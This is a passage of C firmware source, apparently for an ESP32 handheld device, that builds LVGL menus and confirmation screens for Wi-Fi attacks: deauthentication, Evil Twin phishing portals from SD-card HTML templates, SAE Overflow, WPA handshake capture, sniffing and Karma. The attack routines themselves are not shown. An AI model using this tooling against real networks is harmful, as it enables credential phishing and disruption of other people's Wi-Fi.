    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
    char *html_options = (char *)lv_mem_alloc(html_buf_size);
    if (!html_options) {
        html_options = "No HTML templates";
        max_html = 0;
    }

    size_t html_len = 0;
    if (html_options != (char *)"No HTML templates") {
        html_options[0] = '\0';
    }

    int portal_html_count = 0;
    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
        const char *name = wifi_attacks_get_sd_html_name(i);
        if (!name) {
            continue;
        }
        char entry[64];
        const char *display = strrchr(name, '/');
        if (display) {
            display++;
        } else {
            display = name;
        }
        snprintf(entry, sizeof(entry), "%s\n", display);
        size_t entry_len = strlen(entry);
        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
            memcpy(html_options + html_len, entry, entry_len);
            html_len += entry_len;
            html_options[html_len] = '\0';
            portal_html_count++;
        }
    }

    if (portal_html_count == 0) {
        if (html_options != (char *)"No HTML templates") {
            snprintf(html_options, html_buf_size, "No HTML templates");
        }
    }

    lv_dropdown_set_options(portal_html_dd, html_options);
    lv_dropdown_set_selected(portal_html_dd, 0);

    if (html_options != (char *)"No HTML templates") {
        lv_mem_free(html_options);
    }

    // Start Portal button
    portal_start_btn = lv_btn_create(portal_content);
    lv_obj_set_width(portal_start_btn, lv_pct(100));
    lv_obj_set_height(portal_start_btn, 40);
    // Retro terminal styling for button with visible border
    lv_obj_set_style_bg_color(portal_start_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
    lv_obj_set_style_bg_color(portal_start_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    lv_obj_set_style_border_color(portal_start_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(portal_start_btn, 3, 0);  // Thick border (3px)
    lv_obj_set_style_border_opa(portal_start_btn, LV_OPA_COVER, 0);  // Fully opaque border
    lv_obj_add_event_cb(portal_start_btn, portal_start_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *start_label = lv_label_create(portal_start_btn);
    lv_label_set_text(start_label, "Start Portal");
    lv_obj_set_style_text_color(start_label, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_center(start_label);

    // Disable button if no HTML
    if (portal_html_count == 0) {
        lv_obj_add_state(portal_start_btn, LV_STATE_DISABLED);
    }
}

static void portal_start_btn_cb(lv_event_t *e)
{
    (void)e;

    if (!portal_ssid_ta || !portal_html_dd) {
        return;
    }

    // Get SSID from text area
    const char *ssid = lv_textarea_get_text(portal_ssid_ta);
    if (!ssid || strlen(ssid) == 0) {
        ESP_LOGW(TAG, "Portal SSID cannot be empty");
        return;
    }

    // Update buffer
    strncpy(portal_ssid_buffer, ssid, sizeof(portal_ssid_buffer) - 1);
    portal_ssid_buffer[sizeof(portal_ssid_buffer) - 1] = '\0';

    // Get HTML file
    int html_sel = lv_dropdown_get_selected(portal_html_dd);
    int html_count = wifi_attacks_get_sd_html_count();
    if (html_sel < 0 || html_sel >= html_count) {
        ESP_LOGW(TAG, "Invalid HTML selection");
        return;
    }

    const char *html_name = wifi_attacks_get_sd_html_name(html_sel);

    ESP_LOGI(TAG, "Starting Portal with SSID: %s", portal_ssid_buffer);

    // Hide keyboard before creating new page
    if (portal_keyboard) {
        lv_obj_del(portal_keyboard);
        portal_keyboard = NULL;
    }

    // Select HTML template
    if (html_name) {
        esp_err_t html_res = wifi_attacks_select_sd_html(html_sel);
        if (html_res != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set portal template: %s", esp_err_to_name(html_res));
        }
    }

    // Start portal
    esp_err_t start_res = wifi_attacks_start_portal(portal_ssid_buffer);
    if (start_res != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start portal: %s", esp_err_to_name(start_res));
        return;
    }

    ESP_LOGI(TAG, "Portal started successfully");
    nav_to_menu_flag = true;
}

static void create_function_page_base(const char *name)
{
    // Print memory stats when opening new page
    print_memory_stats();
    
    evil_twin_disable_log_capture();
    evil_twin_log_ta = NULL;
    evil_twin_content = NULL;
    evil_twin_network_dd = NULL;
    evil_twin_html_dd = NULL;
    evil_twin_start_btn = NULL;
    evil_twin_status_label = NULL;
    evil_twin_ssid_label = NULL;
    evil_twin_deauth_list_label = NULL;
    evil_twin_status_list = NULL;
    wifi_attacks_set_evil_twin_event_cb(NULL);  // Unregister callback

    blackout_disable_log_capture();
    blackout_log_ta = NULL;
    blackout_stop_btn = NULL;
    blackout_ui_active = false;

    snifferdog_disable_log_capture();
    snifferdog_log_ta = NULL;
    snifferdog_stop_btn = NULL;
    snifferdog_ui_active = false;

    sniffer_disable_log_capture();
    sniffer_log_ta = NULL;
    sniffer_stop_btn = NULL;
    sniffer_ui_active = false;

    sae_overflow_disable_log_capture();
    sae_overflow_log_ta = NULL;
    sae_overflow_stop_btn = NULL;
    sae_overflow_ui_active = false;

    handshake_disable_log_capture();
    handshake_log_ta = NULL;
    handshake_stop_btn = NULL;
    handshake_ui_active = false;
    handshake_attack_active = false;
    handshake_attack_task_handle = NULL;

    wardrive_disable_log_capture();
    wardrive_log_ta = NULL;
    wardrive_stop_btn = NULL;
    wardrive_ui_active = false;

    karma_disable_log_capture();
    karma_log_ta = NULL;
    karma_stop_btn = NULL;
    karma_content = NULL;
    karma_probe_dd = NULL;
    karma_html_dd = NULL;
    karma_start_btn = NULL;
    karma_ui_active = false;

    portal_content = NULL;
    portal_ssid_ta = NULL;
    portal_html_dd = NULL;
    portal_start_btn = NULL;
    portal_keyboard = NULL;

    if (function_page) {
        lv_obj_del(function_page);
        function_page = NULL;
    }
    reset_function_page_children();

    // Hide tiles container and title bar while the function page is active
    if (tiles_container) {
        lv_obj_add_flag(tiles_container, LV_OBJ_FLAG_HIDDEN);
    }
    lv_obj_add_flag(title_bar, LV_OBJ_FLAG_HIDDEN);

    function_page = lv_obj_create(lv_scr_act());
    lv_obj_set_size(function_page, lv_pct(100), lv_pct(100));
    lv_obj_align(function_page, LV_ALIGN_CENTER, 0, 0);
    lv_obj_set_style_bg_color(function_page, lv_color_make(18, 18, 18), 0);  // Material Dark #121212
    lv_obj_set_style_border_width(function_page, 0, 0);
    lv_obj_set_style_radius(function_page, 0, 0);
    lv_obj_set_style_pad_all(function_page, 0, 0);

    lv_obj_t *page_title_bar = lv_obj_create(function_page);
    lv_obj_set_size(page_title_bar, lv_pct(100), 30);
    lv_obj_align(page_title_bar, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(page_title_bar, lv_color_make(30, 30, 30), 0);  // Material Surface #1E1E1E
    lv_obj_set_style_border_width(page_title_bar, 0, 0);
    lv_obj_set_style_radius(page_title_bar, 0, 0);
    lv_obj_clear_flag(page_title_bar, LV_OBJ_FLAG_SCROLLABLE);  // No scroll

    // Home button - Material Blue accent
    lv_obj_t *home_btn = lv_btn_create(page_title_bar);
    lv_obj_set_size(home_btn, 30, 30);
    lv_obj_align(home_btn, LV_ALIGN_LEFT_MID, 0, 0);
    lv_obj_set_style_bg_color(home_btn, lv_color_make(33, 150, 243), 0);  // Material Blue #2196F3
    lv_obj_set_style_bg_color(home_btn, lv_color_make(66, 165, 245), LV_STATE_PRESSED);  // Lighter blue
    lv_obj_set_style_radius(home_btn, 5, 0);
    lv_obj_set_style_shadow_width(home_btn, 4, 0);
    lv_obj_set_style_shadow_color(home_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(home_btn, LV_OPA_30, 0);
    lv_obj_add_event_cb(home_btn, home_btn_event_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *home_label = lv_label_create(home_btn);
    lv_label_set_text(home_label, LV_SYMBOL_HOME);
    lv_obj_set_style_text_color(home_label, lv_color_make(255, 255, 255), 0);  // White icon
    lv_obj_center(home_label);

    lv_obj_t *page_title_label = lv_label_create(page_title_bar);
    lv_label_set_text(page_title_label, name ? name : "");
    lv_obj_set_style_text_color(page_title_label, lv_color_make(255, 255, 255), 0);  // White text
    lv_obj_center(page_title_label);
}

void show_menu(void)
{
    evil_twin_log_capture_enabled = false;
    evil_twin_log_ta = NULL;
    evil_twin_ssid_label = NULL;
    evil_twin_deauth_list_label = NULL;
    evil_twin_status_list = NULL;
    wifi_attacks_set_evil_twin_event_cb(NULL);  // Unregister callback
    // Delete function page if it exists
    if (function_page) {
        lv_obj_del(function_page);
        function_page = NULL;
    }
    reset_function_page_children();
    
    // Show main tiles and title bar
    show_main_tiles();
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_HIDDEN);
}

void show_function_page(const char *name)
{
    create_function_page_base(name);
    // Center text showing function name
    lv_obj_t *center_label = lv_label_create(function_page);
    lv_label_set_text(center_label, name);
    lv_obj_set_style_text_font(center_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(center_label, COLOR_MATERIAL_BLUE, 0);  // Green text (retro terminal)
    lv_obj_center(center_label);
    
    // Logging removed to avoid VFS writes during draw
}

// ============================================================================
// TILE-BASED NAVIGATION SYSTEM
// ============================================================================

// Home button callback - sends UART reboot command and returns to main tiles
static void home_btn_event_cb(lv_event_t *e)
{
    (void)e;
    // Send "reboot" command via UART (GPS UART port)
    const char *reboot_cmd = "reboot\n";
    uart_write_bytes(GPS_UART_NUM, reboot_cmd, strlen(reboot_cmd));
    ESP_LOGI(TAG, "UART reboot command sent");
    
    // Stop all active attacks
    wifi_attacks_stop_all();
    
    // Navigate back to main tiles
    nav_to_menu_flag = true;
}

// Create a single tile button
static lv_obj_t *create_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t bg_color, lv_event_cb_t callback, const char *user_data)
{
    lv_obj_t *tile = lv_btn_create(parent);
    lv_obj_set_size(tile, 145, 85);  // Tile size for 3 columns
    lv_obj_set_style_bg_color(tile, bg_color, LV_STATE_DEFAULT);
    // Pressed state: lighten the color
    lv_obj_set_style_bg_color(tile, lv_color_lighten(bg_color, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(tile, 0, 0);  // No border for Material look
    lv_obj_set_style_radius(tile, 12, 0);  // Rounded corners
    lv_obj_set_style_shadow_width(tile, 8, 0);  // Material shadow
    lv_obj_set_style_shadow_color(tile, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(tile, LV_OPA_30, 0);
    lv_obj_set_flex_flow(tile, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(tile, 8, 0);
    
    if (icon) {
        lv_obj_t *icon_label = lv_label_create(tile);
        lv_label_set_text(icon_label, icon);
        lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_20, 0);
        lv_obj_set_style_text_color(icon_label, lv_color_make(255, 255, 255), 0);  // White icon
    }
    
    if (text) {
        lv_obj_t *text_label = lv_label_create(tile);
        lv_label_set_text(text_label, text);
        lv_obj_set_style_text_font(text_label, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(text_label, lv_color_make(255, 255, 255), 0);  // White text
        lv_obj_set_style_text_align(text_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_label_set_long_mode(text_label, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(text_label, 130);
    }
    
    if (callback && user_data) {
        lv_obj_add_event_cb(tile, callback, LV_EVENT_CLICKED, (void*)user_data);
    }
    
    return tile;
}

// Create a smaller tile button for compact layouts (e.g., attack selection row)
static lv_obj_t *create_small_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t bg_color, lv_event_cb_t callback, const char *user_data)
{
    lv_obj_t *tile = lv_btn_create(parent);
    lv_obj_set_size(tile, 85, 55);  // Smaller tile size for single row
    lv_obj_set_style_bg_color(tile, bg_color, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(tile, lv_color_lighten(bg_color, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(tile, 0, 0);
    lv_obj_set_style_radius(tile, 8, 0);  // Smaller radius
    lv_obj_set_style_shadow_width(tile, 4, 0);  // Smaller shadow
    lv_obj_set_style_shadow_color(tile, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(tile, LV_OPA_30, 0);
    lv_obj_set_flex_flow(tile, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(tile, 4, 0);
    
    if (icon) {
        lv_obj_t *icon_label = lv_label_create(tile);
        lv_label_set_text(icon_label, icon);
        lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_14, 0);  // Smaller icon
        lv_obj_set_style_text_color(icon_label, lv_color_make(255, 255, 255), 0);
    }
    
    if (text) {
        lv_obj_t *text_label = lv_label_create(tile);
        lv_label_set_text(text_label, text);
        lv_obj_set_style_text_font(text_label, &lv_font_montserrat_12, 0);  // Smaller text
        lv_obj_set_style_text_color(text_label, lv_color_make(255, 255, 255), 0);
        lv_obj_set_style_text_align(text_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_label_set_long_mode(text_label, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(text_label, 75);
    }
    
    if (callback && user_data) {
        lv_obj_add_event_cb(tile, callback, LV_EVENT_CLICKED, (void*)user_data);
    }
    
    return tile;
}

// Main tile event callback - routes to appropriate screen
static void main_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    if (!tile_name) return;
    
    if (strcmp(tile_name, "WiFi Scan & Attack") == 0) {
        show_wifi_scan_attack_screen();
    } else if (strcmp(tile_name, "Global WiFi Attacks") == 0) {
        show_global_attacks_screen();
    } else if (strcmp(tile_name, "WiFi Sniff&Karma") == 0) {
        show_sniff_karma_screen();
    } else if (strcmp(tile_name, "WiFi Monitor") == 0) {
        show_wifi_monitor_screen();
    } else if (strcmp(tile_name, "Deauth Monitor") == 0) {
        show_stub_screen("Deauth Monitor");
    } else if (strcmp(tile_name, "Bluetooth") == 0) {
        show_bluetooth_screen();
    }
}

// Attack tile event callback - after selecting networks
static void attack_tile_event_cb(lv_event_t *e)
{
    const char *attack_name = (const char *)lv_event_get_user_data(e);
    if (!attack_name) return;
    
    // Route to existing attack handlers
    if (strcmp(attack_name, "Deauth") == 0) {
        // Redirect to "Deauther" handler in attack_event_cb with a synthetic event
        lv_event_t synthetic_event;
        memset(&synthetic_event, 0, sizeof(synthetic_event));
        synthetic_event.user_data = (void*)"Deauther";
        attack_event_cb(&synthetic_event);
        return;
    } else if (strcmp(attack_name, "Evil Twin") == 0) {
        show_evil_twin_page();
    } else if (strcmp(attack_name, "SAE Overflow") == 0) {
        // Reuse existing SAE overflow logic
        create_function_page_base("SAE Overflow");
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "Warning: This will start\nSAE Overflow attack.\n\nSelect ONE network first.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);
        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);
        
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(back_btn, 2, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_border_color(yes_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(yes_btn, 2, 0);
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, sae_overflow_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
    } else if (strcmp(attack_name, "Handshaker") == 0) {
        // Reuse existing handshake logic
        create_function_page_base("Handshakes");
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "WPA Handshake Capture\n\nSelected networks: Attack those\nNo selection: Scan & attack all\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_14, 0);
        lv_obj_center(warning_label);
        
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);
        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);
        
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(back_btn, 2, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_border_color(yes_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(yes_btn, 2, 0);
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, handshake_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
    } else if (strcmp(attack_name, "Sniffer") == 0) {
        // Reuse existing sniffer logic
        create_function_page_base("Sniffer");
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "This will start\nWiFi Sniffer.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);
        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);
        
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(back_btn, 2, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_border_color(yes_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(yes_btn, 2, 0);
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, sniffer_yes_btn_cb, LV_EVENT_CLICKED, NULL);
    }
}

// Material Dark color palette
#define COLOR_MATERIAL_BG       lv_color_make(18, 18, 18)      // #121212
#define COLOR_MATERIAL_SURFACE  lv_color_make(30, 30, 30)      // #1E1E1E
// COLOR_MATERIAL_BLUE and COLOR_MATERIAL_RED defined at top of file
#define COLOR_MATERIAL_PURPLE   lv_color_make(156, 39, 176)    // #9C27B0
#define COLOR_MATERIAL_GREEN    lv_color_make(76, 175, 80)     // #4CAF50
#define COLOR_MATERIAL_CYAN     lv_color_make(0, 188, 212)     // #00BCD4
#define COLOR_MATERIAL_ORANGE   lv_color_make(255, 152, 0)     // #FF9800
#define COLOR_MATERIAL_PINK     lv_color_make(233, 30, 99)     // #E91E63
#define COLOR_MATERIAL_TEAL     lv_color_make(0, 150, 136)     // #009688
#define COLOR_MATERIAL_AMBER    lv_color_make(255, 193, 7)     // #FFC107
#define COLOR_MATERIAL_INDIGO   lv_color_make(63, 81, 181)     // #3F51B5

// Show main tiles screen (5 tiles)
static void show_main_tiles(void)
{
    // Delete existing tiles container if present
    if (tiles_container) {
        lv_obj_del(tiles_container);
        tiles_container = NULL;
    }
    
    // Delete function page if present
    if (function_page) {
        lv_obj_del(function_page);
        function_page = NULL;
    }
    reset_function_page_children();
    
    // Create tiles container with Material Dark background
    tiles_container = lv_obj_create(lv_scr_act());
    lv_obj_set_size(tiles_container, lv_pct(100), 290);
    lv_obj_align(tiles_container, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(tiles_container, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(tiles_container, 0, 0);
    lv_obj_set_style_radius(tiles_container, 0, 0);
    lv_obj_set_style_pad_all(tiles_container, 10, 0);
    lv_obj_set_style_pad_gap(tiles_container, 10, 0);
    lv_obj_set_flex_flow(tiles_container, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(tiles_container, LV_OBJ_FLAG_SCROLLABLE);
    
    // Create 6 main tiles with Material colors
    create_tile(tiles_container, LV_SYMBOL_WIFI, "WiFi Scan\n& Attack", COLOR_MATERIAL_BLUE, main_tile_event_cb, "WiFi Scan & Attack");
    create_tile(tiles_container, LV_SYMBOL_WARNING, "Global WiFi\nAttacks", COLOR_MATERIAL_RED, main_tile_event_cb, "Global WiFi Attacks");
    create_tile(tiles_container, LV_SYMBOL_EYE_OPEN, "WiFi Sniff\n& Karma", COLOR_MATERIAL_PURPLE, main_tile_event_cb, "WiFi Sniff&Karma");
    create_tile(tiles_container, LV_SYMBOL_SETTINGS, "WiFi\nMonitor", COLOR_MATERIAL_GREEN, main_tile_event_cb, "WiFi Monitor");
    create_tile(tiles_container, LV_SYMBOL_GPS, "Deauth\nMonitor", COLOR_MATERIAL_AMBER, main_tile_event_cb, "Deauth Monitor");
    create_tile(tiles_container, LV_SYMBOL_BLUETOOTH, "Bluetooth", COLOR_MATERIAL_CYAN, main_tile_event_cb, "Bluetooth");
    
    // Show title bar
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_HIDDEN);
}

// WiFi Scan Next button callback - shows attack tiles
static void wifi_scan_next_btn_cb(lv_event_t *e)
{
    (void)e;
    show_attack_tiles_screen();
}

// WiFi Scan & Attack screen - scan and show network list with checkboxes
static void show_wifi_scan_attack_screen(void)
{
    // Ensure WiFi mode is active
    if (!ensure_wifi_mode()) {
        ESP_LOGE(TAG, "Failed to switch to WiFi mode for scan");
        return;
    }
    
    create_function_page_base("WiFi Scan & Attack");
    
    // Create centered scanning container with icon and text
    lv_obj_t *scan_container = lv_obj_create(function_page);
    lv_obj_set_size(scan_container, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_center(scan_container);
    lv_obj_set_style_bg_opa(scan_container, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(scan_container, 0, 0);
    lv_obj_set_flex_flow(scan_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(scan_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(scan_container, 10, 0);
    
    // WiFi scanning icon
    lv_obj_t *scan_icon = lv_label_create(scan_container);
    lv_label_set_text(scan_icon, LV_SYMBOL_WIFI);
    lv_obj_set_style_text_font(scan_icon, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(scan_icon, COLOR_MATERIAL_BLUE, 0);
    
    // Scanning text
    scan_status_label = lv_label_create(scan_container);
    lv_label_set_text(scan_status_label, "Scanning...");
    lv_obj_set_style_text_color(scan_status_label, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_text_font(scan_status_label, &lv_font_montserrat_20, 0);
    
    // Clear previous selections when user manually starts scan
    wifi_scanner_clear_selections();
    wifi_scanner_clear_targets();
    
    // Start scan
    wifi_scanner_start_scan();
}

// Attack tiles screen - shown after selecting networks
static void show_attack_tiles_screen(void)
{
    create_function_page_base("Select Attack");
    
    // Create small tiles container at top (single row) with extra spacing
    lv_obj_t *attack_tiles = lv_obj_create(function_page);
    lv_obj_set_size(attack_tiles, lv_pct(100), 70);
    lv_obj_align(attack_tiles, LV_ALIGN_TOP_MID, 0, 40);  // Extra 10px spacing above tiles
    lv_obj_set_style_bg_color(attack_tiles, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(attack_tiles, 0, 0);
    lv_obj_set_style_pad_all(attack_tiles, 5, 0);
    lv_obj_set_style_pad_gap(attack_tiles, 5, 0);
    lv_obj_set_flex_flow(attack_tiles, LV_FLEX_FLOW_ROW);  // Single row, no wrap
    lv_obj_set_flex_align(attack_tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(attack_tiles, LV_OBJ_FLAG_SCROLLABLE);
    
    // Create smaller attack tiles in single row
    create_small_tile(attack_tiles, LV_SYMBOL_CHARGE, "Deauth", COLOR_MATERIAL_RED, attack_tile_event_cb, "Deauth");
    create_small_tile(attack_tiles, LV_SYMBOL_WARNING, "Evil Twin", COLOR_MATERIAL_ORANGE, attack_tile_event_cb, "Evil Twin");
    create_small_tile(attack_tiles, LV_SYMBOL_POWER, "SAE", COLOR_MATERIAL_PINK, attack_tile_event_cb, "SAE Overflow");
    create_small_tile(attack_tiles, LV_SYMBOL_DOWNLOAD, "Handshake", COLOR_MATERIAL_AMBER, attack_tile_event_cb, "Handshaker");
    create_small_tile(attack_tiles, LV_SYMBOL_EYE_OPEN, "Sniffer", COLOR_MATERIAL_PURPLE, attack_tile_event_cb, "Sniffer");
    
    // Horizontal separator line above Selected Networks
    lv_obj_t *separator = lv_obj_create(function_page);
    lv_obj_set_size(separator, lv_pct(90), 2);
    lv_obj_align(separator, LV_ALIGN_TOP_MID, 0, 115);
    lv_obj_set_style_bg_color(separator, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_bg_opa(separator, LV_OPA_50, 0);
    lv_obj_set_style_border_width(separator, 0, 0);
    lv_obj_set_style_radius(separator, 1, 0);
    
    // Selected networks header
